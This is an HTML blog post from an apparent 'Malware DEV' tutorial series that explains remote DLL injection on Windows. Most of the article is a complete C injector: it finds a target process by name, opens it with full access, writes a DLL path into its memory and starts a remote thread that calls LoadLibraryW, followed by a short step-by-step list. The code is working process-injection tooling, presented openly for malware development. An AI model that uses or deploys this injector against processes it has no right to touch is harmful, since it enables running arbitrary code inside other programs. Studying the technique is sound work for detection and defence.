<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Remote DLL Injection - pwn3rx0</title>
  <meta name="description" content="A technical deep dive into injecting a Dynamic-Link Library (DLL) into a remote process using VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread.">
  <meta name="keywords" content="malware-development, dll-injection, win-api, process-manipulation, execution, cybersecurity, security, writeups, ctf, pentest, penetration testing, red team, red teaming, malware, malware development, windows internals, windows api, shellcode, payload, injection, active directory, ad, ad enumeration, kerberoasting, lateral movement, post exploitation, defense evasion, opsec, privilege escalation, blue team, incident response, andrew mamdouh, pwn3rx0, andrew_mamdouh, malware dev">
  <meta name="author" content="Andrew Mamdouh (pwn3rx0)">
  <link rel="canonical" href="/writeups/Malware DEV/Execution/Remote Dll injection.html">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta property="og:title" content="Remote DLL Injection">
  <meta property="og:description" content="A technical deep dive into injecting a Dynamic-Link Library (DLL) into a remote process using VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread.">
  <meta property="og:type" content="article">
  <meta property="og:site_name" content="pwn3rx0 blog">
  <meta property="og:image" content="/assets/images/og-home.png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:url" content="/writeups/Malware DEV/Execution/Remote Dll injection.html">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Remote DLL Injection">
  <meta name="twitter:description" content="A technical deep dive into injecting a Dynamic-Link Library (DLL) into a remote process using VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread.">
  <meta name="twitter:image" content="/assets/images/og-home.png">
  <meta name="site-base" content="/">
  <link rel="stylesheet" href="/assets/css/styles.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.9.0/styles/github-dark.min.css">
  <link rel="icon" href="/assets/icons/favicon.svg" type="image/svg+xml">
  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon" sizes="any">
</head>
<body>
  <div class="app-container">
    <aside class="sidebar">
      <div class="profile-card">
        <div class="avatar">
          <img src="/assets/images/profile.jpg" alt="Andrew Mamdouh">
        </div>
        <div class="profile-name">Andrew Mamdouh</div>
        <div class="profile-nick" style="color:#8a8f98;">(pwn3rx0)</div>
        <nav class="social-tabs">
          <a class="chip" href="https://github.com/pwn3rx0">GitHub</a>
          <a class="chip" href="https://www.linkedin.com/in/andrew-mamdouh122">LinkedIn</a>
          <a class="chip" href="https://x.com/pwn3rx0">X</a>
        </nav>
      </div>
      <nav class="category-tree"></nav>
    </aside>
    <main class="main-content">
      <nav class="breadcrumbs">
      
      <a href="/">Home</a>
    
      <span class="separator">/</span>
      <a href="/category/Malware DEV.html">Malware DEV</a>
    
      <span class="separator">/</span>
      <a href="/category/Malware DEV/Execution.html">Execution</a>
    
      <span class="separator">/</span>
      <span class="current">Remote DLL Injection</span>
    </nav>
      <article class="writeup">
        <header>
          <h1>Remote DLL Injection</h1>
          <div class="writeup-meta">
            <div class="writeup-date">date: <time datetime="February 24, 2026 at 02:00 AM">February 24, 2026 at 02:00 AM</time></div>
            <div class="tags-row">
              <div class="tags-label">tags:</div>
              <div class="tags"><span class="tag">malware-development</span><span class="tag">dll-injection</span><span class="tag">win-api</span><span class="tag">process-manipulation</span><span class="tag">execution</span></div>
            </div>
            
          </div>
        </header>
        <div class="writeup-content"><h2>What is Remote DLL Injection?</h2>
<p>Remote DLL Injection is a technique where a malicious or legitimate DLL is loaded into the address space of a running process from another process. This allows the injector to execute arbitrary code within the context of the target process, useful for debugging, hooking, or in some cases, malware execution.</p>
<pre><code class="language-c">#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;tlhelp32.h&gt;

void WaitForEnter(const char* msg) {
    printf(&quot;%s&quot;, msg);
    fflush(stdout);
    int c = getchar();  // assign to variable to avoid unused warning
    (void)c;            // explicitly ignore
}

BOOL GetRemoteProcessHandle(LPCWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf(&quot;[!] CreateToolhelp32Snapshot failed with error %lu\n&quot;, GetLastError());
        return FALSE;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &amp;pe)) {
        printf(&quot;[!] Process32FirstW failed with error %lu\n&quot;, GetLastError());
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        if (_wcsicmp(pe.szExeFile, szProcessName) == 0) {
            *dwProcessId = pe.th32ProcessID;
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
            if (*hProcess == NULL) {
                printf(&quot;[!] OpenProcess failed with error %lu\n&quot;, GetLastError());
                CloseHandle(hSnapshot);
                return FALSE;
            }
            CloseHandle(hSnapshot);
            return TRUE;
        }
    } while (Process32NextW(hSnapshot, &amp;pe));

    CloseHandle(hSnapshot);
    return FALSE;
}

BOOL InjectDllToRemoteProcess(HANDLE hProcess, LPCWSTR dllPath, HMODULE* outRemoteModule) {
    SIZE_T dllPathSize = (wcslen(dllPath) + 1) * sizeof(WCHAR);

    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        printf(&quot;[!] VirtualAllocEx failed with error %lu\n&quot;, GetLastError());
        return FALSE;
    }

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remoteMem, dllPath, dllPathSize, &amp;written) || written != dllPathSize) {
        printf(&quot;[!] WriteProcessMemory failed with error %lu\n&quot;, GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return FALSE;
    }

    HMODULE hKernel32 = GetModuleHandleW(L&quot;kernel32.dll&quot;);
    if (!hKernel32) {
        printf(&quot;[!] GetModuleHandleW(kernel32.dll) failed with error %lu\n&quot;, GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return FALSE;
    }

    FARPROC loadLibraryAddr = GetProcAddress(hKernel32, &quot;LoadLibraryW&quot;);
    if (!loadLibraryAddr) {
        printf(&quot;[!] GetProcAddress(LoadLibraryW) failed with error %lu\n&quot;, GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteMem, 0, NULL);
    if (!hThread) {
        printf(&quot;[!] CreateRemoteThread failed with error %lu\n&quot;, GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);

    DWORD_PTR remoteModuleBase = 0;
    if (!GetExitCodeThread(hThread, (LPDWORD)&amp;remoteModuleBase)) {
        printf(&quot;[!] GetExitCodeThread failed with error %lu\n&quot;, GetLastError());
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return FALSE;
    }

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);

    if (remoteModuleBase == 0) {
        printf(&quot;[!] Remote LoadLibraryW returned NULL. DLL injection failed.\n&quot;);
        return FALSE;
    }

    if (outRemoteModule) {
        *outRemoteModule = (HMODULE)remoteModuleBase;
    }

    printf(&quot;[+] DLL successfully loaded at remote address: 0x%p\n&quot;, (void*)remoteModuleBase);
    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc &lt; 3) {
        wprintf(L&quot;Usage: %s &lt;Full DLL Path&gt; &lt;Process Name&gt;\n&quot;, argv[0]);
        return 1;
    }

    LPCWSTR dllPath = argv[1];
    LPCWSTR processName = argv[2];

    DWORD attr = GetFileAttributesW(dllPath);
    if (attr == INVALID_FILE_ATTRIBUTES || (attr &amp; FILE_ATTRIBUTE_DIRECTORY)) {
        wprintf(L&quot;[!] DLL file \&quot;%s\&quot; does not exist or is inaccessible.\n&quot;, dllPath);
        return 1;
    }
    wprintf(L&quot;[+] DLL file \&quot;%s\&quot; exists.\n&quot;, dllPath);

    WaitForEnter(&quot;[#] Press &lt;Enter&gt; to start process search...&quot;);

    DWORD processId = 0;
    HANDLE hProcess = NULL;
    if (!GetRemoteProcessHandle(processName, &amp;processId, &amp;hProcess)) {
        wprintf(L&quot;[-] Process \&quot;%s\&quot; not found.\n&quot;, processName);
        return 1;
    }
    wprintf(L&quot;[+] Found process \&quot;%s\&quot; with PID %lu.\n&quot;, processName, processId);

    WaitForEnter(&quot;[#] Press &lt;Enter&gt; to start DLL injection...&quot;);

    HMODULE remoteModule = NULL;
    if (!InjectDllToRemoteProcess(hProcess, dllPath, &amp;remoteModule)) {
        printf(&quot;[-] DLL injection failed.\n&quot;);
        CloseHandle(hProcess);
        return 1;
    }

    printf(&quot;[+] DLL injection succeeded.\n&quot;);

    CloseHandle(hProcess);

    WaitForEnter(&quot;[#] Press &lt;Enter&gt; to exit...&quot;);

    return 0;
}
</code></pre>
<ul>
<li><strong>Check DLL File</strong>
  Verify the DLL you want to inject exists and is accessible.</li>
<li><strong>Find Target Process</strong>
  Search all running processes for the one with the specified name. Get its Process ID (PID) and open a handle to it with full access rights.</li>
<li><strong>Allocate Memory in Target Process</strong>
  Reserve memory inside the target process large enough to store the DLL path string.</li>
<li><strong>Write DLL Path to Target Process Memory</strong>
  Copy the DLL path string into the allocated memory inside the target process.</li>
<li><strong>Get Address of <code>LoadLibraryW</code></strong>
  Find the address of the Windows API function <code>LoadLibraryW</code> in the current process. This function loads DLLs.</li>
<li><strong>Create Remote Thread in Target Process</strong>
  Start a new thread in the target process that runs <code>LoadLibraryW</code> with the DLL path you wrote. This causes the target process to load your DLL.</li>
<li><strong>Wait for DLL to Load</strong>
  Wait for the remote thread to finish execution.</li>
<li><strong>Check if Injection Succeeded</strong>
  Get the thread’s exit code, which is the base address of the loaded DLL if successful.</li>
<li><strong>Clean Up</strong>
  Free the allocated memory in the target process and close all handles.</li>
</ul>
</div>
        <nav class="post-navigation">
          
      <a href="/writeups/Malware DEV/Execution/Local Payload Execution.html" class="nav-link prev-post">
        <span class="nav-direction">← Previous</span>
        <span class="nav-title">Local Payload Execution</span>
      </a>
    
          
      <a href="/writeups/Malware DEV/Execution/Remote ShellCode Injection.html" class="nav-link next-post">
        <span class="nav-direction">Next →</span>
        <span class="nav-title">Remote Shellcode Injection</span>
      </a>
    
        </nav>
        
      <aside class="related-posts">
        <h3>Related Writeups</h3>
        <ul class="related-list">
          <li><a href="/writeups/Malware DEV/Encryption/RC4 Native API.html">RC4 Stream Cipher (Native API)</a></li><li><a href="/writeups/Malware DEV/Obfuscation/To IPs.html">IPv4 Masquerading (Obfuscation)</a></li><li><a href="/writeups/Malware DEV/Payload Placement/Staged/HTTP Stageing.html">HTTP Stager & Remote Payload Delivery</a></li>
        </ul>
      </aside>
    
      </article>
    </main>
  </div>
  <button class="mobile-menu-toggle">☰</button>
  <script src="/assets/js/main.js"></script>
  <script src="/assets/js/navigation.js"></script>
  <script>
    window.MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']],
        displayMath: [['$$','$$'], ['\\[','\\]']]
      },
      svg: { fontCache: 'global' }
    };
  </script>
  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js" defer></script>
  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js" defer></script>
  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js" defer></script>
  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/c.min.js" defer></script>
  <script>
    (function() {
      function enhanceCodeBlocks(scope) {
        const container = scope || document.querySelector('.writeup-content') || document;
        const blocks = Array.from(container.querySelectorAll('pre > code')).filter(c => !c.closest('.code-block'));
        blocks.forEach(code => {
          const pre = code.parentElement;
          if (!pre || pre.dataset.enhanced === 'true') return;
          pre.dataset.enhanced = 'true';
          let langClass = Array.from(code.classList || []).find(c => c.startsWith('language-'));
          if (!langClass) {
            const t = code.textContent || '';
            if (/#include\s+<[^>]+>/.test(t) || /\bint\s+main\s*\(/.test(t) || /#include\s+<Windows\.h>/i.test(t)) {
              code.classList.add('language-c');
              langClass = 'language-c';
            }
          }
          const lang = (langClass ? langClass.replace('language-', '') : 'text').toUpperCase();
          const wrapper = document.createElement('div');
          wrapper.className = 'code-block';
          const header = document.createElement('div');
          header.className = 'code-header';
          const langEl = document.createElement('span');
          langEl.className = 'code-lang';
          langEl.textContent = lang;
          const btn = document.createElement('button');
          btn.className = 'code-copy';
          btn.type = 'button';
          btn.textContent = 'Copy';
          btn.addEventListener('click', async () => {
            const text = code.innerText;
            const fallbackCopy = () => {
              const ta = document.createElement('textarea');
              ta.value = text;
              ta.style.position = 'fixed';
              ta.style.opacity = '0';
              ta.style.left = '-9999px';
              document.body.appendChild(ta);
              ta.focus();
              ta.select();
              try {
                document.execCommand('copy');
                btn.textContent = 'Copied';
              } catch (_) {
                btn.textContent = 'Failed';
              } finally {
                document.body.removeChild(ta);
                setTimeout(() => (btn.textContent = 'Copy'), 1200);
              }
            };
            try {
              if (navigator.clipboard && window.isSecureContext) {
                await navigator.clipboard.writeText(text);
                btn.textContent = 'Copied';
                setTimeout(() => (btn.textContent = 'Copy'), 1200);
              } else {
                fallbackCopy();
              }
            } catch (_) {
              fallbackCopy();
            }
          });
          header.appendChild(langEl);
          header.appendChild(btn);
          const holder = document.createElement('div');
          holder.className = 'code-content';
          pre.replaceWith(wrapper);
          holder.appendChild(pre);
          wrapper.appendChild(header);
          wrapper.appendChild(holder);
          if (window.hljs && typeof window.hljs.highlightElement === 'function') {
            window.hljs.highlightElement(code);
          } else if (window.hljs && typeof window.hljs.highlightAll === 'function') {
            window.hljs.highlightAll();
          }
        });
      }
      function indentAfterHeadings(scope) {
        const container = scope || document.querySelector('.writeup-content');
        if (!container) return;
        const headings = container.querySelectorAll('h1,h2,h3,h4,h5,h6');
        headings.forEach(h => {
          const level = parseInt(h.tagName.substring(1), 10);
          let el = h.nextElementSibling;
          while (el) {
            if (/^H[1-6]$/.test(el.tagName)) {
              const nextLevel = parseInt(el.tagName.substring(1), 10);
              if (nextLevel <= level) break;
            }
            if (el.tagName === 'P') {
              el.classList.add('indent-p');
            }
            el = el.nextElementSibling;
          }
        });
      }
      function initEnhancements() {
        if (window.mermaid) {
          mermaid.initialize({ startOnLoad: true, theme: 'dark' });
        }
        enhanceCodeBlocks();
        indentAfterHeadings();
        if (window.hljs && typeof window.hljs.highlightAll === 'function') {
          window.hljs.highlightAll();
        }
        const target = document.querySelector('.writeup-content');
        if (target && window.MutationObserver) {
          const mo = new MutationObserver(() => {
            enhanceCodeBlocks(target);
            indentAfterHeadings(target);
            if (window.hljs && typeof window.hljs.highlightAll === 'function') {
              window.hljs.highlightAll();
            }
          });
          mo.observe(target, { childList: true, subtree: true });
        }
      }
      window.addEventListener('load', initEnhancements);
    })();
  </script>
</body>
</html>
